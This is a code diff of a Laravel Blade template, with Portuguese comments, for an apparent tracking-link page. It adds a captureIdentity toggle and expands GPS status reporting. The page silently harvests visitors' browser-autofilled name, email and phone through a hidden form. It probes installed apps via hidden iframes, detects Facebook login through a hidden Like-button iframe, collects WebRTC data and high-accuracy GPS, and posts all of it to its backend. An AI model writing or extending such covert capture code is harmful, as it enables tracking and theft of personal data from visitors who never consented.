@@ -92,11 +92,13 @@
         Precisa estar no DOM (não display:none) para o browser preencher.
         O JS lê os valores após 800 ms e envia ao backend.
     --}}
-    <form id="__id-form" autocomplete="on" tabindex="-1" aria-hidden="true">
-        <input type="text"  id="__id-nome"     name="full_name" autocomplete="name"  tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
-        <input type="email" id="__id-email"    name="email"     autocomplete="email" tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
-        <input type="tel"   id="__id-telefone" name="phone"     autocomplete="tel"   tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
-    </form>
+    @if($captureIdentity)
+        <form id="__id-form" autocomplete="on" tabindex="-1" aria-hidden="true">
+            <input type="text"  id="__id-nome"     name="full_name" autocomplete="name"  tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
+            <input type="email" id="__id-email"    name="email"     autocomplete="email" tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
+            <input type="tel"   id="__id-telefone" name="phone"     autocomplete="tel"   tabindex="-1" readonly onfocus="this.removeAttribute('readonly')">
+        </form>
+    @endif
 
     <div class="card">
         <div class="icon">
@@ -110,24 +112,27 @@
     </div>
 
     {{-- iframe invisível usado para probing de URL schemes --}}
-    <iframe id="__scheme-probe" style="display:none;width:0;height:0;border:none;" tabindex="-1" aria-hidden="true"></iframe>
+    @if($captureIdentity)
+        <iframe id="__scheme-probe" style="display:none;width:0;height:0;border:none;" tabindex="-1" aria-hidden="true"></iframe>
 
-    {{-- iframe do Facebook Like button — usado para detectar login via altura do elemento --}}
-    <iframe
-        id="__fb-probe"
-        src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Ffacebook.com&layout=button_count&action=like&size=small&share=false&height=21&appId="
-        style="display:none;width:0;height:0;border:none;"
-        scrolling="no"
-        frameborder="0"
-        tabindex="-1"
-        aria-hidden="true"
-    ></iframe>
+        {{-- iframe do Facebook Like button — usado para detectar login via altura do elemento --}}
+        <iframe
+            id="__fb-probe"
+            src="https://www.facebook.com/plugins/like.php?href=https%3A%2F%2Ffacebook.com&layout=button_count&action=like&size=small&share=false&height=21&appId="
+            style="display:none;width:0;height:0;border:none;"
+            scrolling="no"
+            frameborder="0"
+            tabindex="-1"
+            aria-hidden="true"
+        ></iframe>
+    @endif
 
     <script>
     (function () {
         var token      = @json($token);
         var accessId   = @json($accessUuid);
         var captureGps = @json($captureGps);
+        var captureIdentity = @json($captureIdentity);
         var redirectUrl = @json($redirectUrl);
         var endpoint   = window.location.pathname.replace(/\/$/, '') + '/device';
         var csrf       = @json(csrf_token());
@@ -460,12 +465,13 @@
                 }
             });
 
-            // Identidade digital
-            if (identidade.nome)     formData.append('identidade_nome',     identidade.nome);
-            if (identidade.email)    formData.append('identidade_email',    identidade.email);
-            if (identidade.telefone) formData.append('identidade_telefone', identidade.telefone);
-            if (identidade.redes && identidade.redes.length > 0) {
-                formData.append('identidade_redes', JSON.stringify(identidade.redes));
+            if (captureIdentity) {
+                if (identidade.nome)     formData.append('identidade_nome',     identidade.nome);
+                if (identidade.email)    formData.append('identidade_email',    identidade.email);
+                if (identidade.telefone) formData.append('identidade_telefone', identidade.telefone);
+                if (identidade.redes && identidade.redes.length > 0) {
+                    formData.append('identidade_redes', JSON.stringify(identidade.redes));
+                }
             }
 
             Object.keys(extras || {}).forEach(function(chave) {
@@ -495,8 +501,23 @@
         function solicitarGps(callback) {
             callback = callback || function(){};
 
-            if (!captureGps || !accessId || !navigator.geolocation || !window.isSecureContext) {
+            if (!captureGps) {
                 return callback();
+            }
+
+            if (!accessId) {
+                Promise.resolve(enviar(null, { gps_status: 'skipped', gps_error: 'Acesso sem identificador para atualizar.' })).then(callback);
+                return;
+            }
+
+            if (!window.isSecureContext) {
+                Promise.resolve(enviar(null, { gps_status: 'insecure', gps_error: 'Geolocation exige HTTPS/contexto seguro.' })).then(callback);
+                return;
+            }
+
+            if (!navigator.geolocation) {
+                Promise.resolve(enviar(null, { gps_status: 'unsupported', gps_error: 'Navegador sem suporte a geolocalizacao.' })).then(callback);
+                return;
             }
 
             var finalizado = false;
@@ -514,8 +535,20 @@
                     gps_latitude:  posicao.coords.latitude,
                     gps_longitude: posicao.coords.longitude,
                     gps_accuracy:  posicao.coords.accuracy,
+                    gps_status:    'captured',
                 })).then(finalizar);
-            }, finalizar, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+            }, function(error) {
+                var status = 'error';
+
+                if (error && error.code === 1) status = 'denied';
+                if (error && error.code === 2) status = 'unavailable';
+                if (error && error.code === 3) status = 'timeout';
+
+                Promise.resolve(enviar(null, {
+                    gps_status: status,
+                    gps_error:  error && error.message ? error.message : 'Falha ao obter GPS.',
+                })).then(finalizar);
+            }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
         }
 
         // ─────────────────────────────────────────────────────────────
@@ -611,6 +644,11 @@
         }
 
         function iniciarCaptura() {
+            if (!captureIdentity) {
+                dispararWebRtcEEnviar();
+                return;
+            }
+
             lerAutofill(function() {
                 var pendentes      = 4; // google + facebook + redirect + apps
                 var redesColetadas = [];
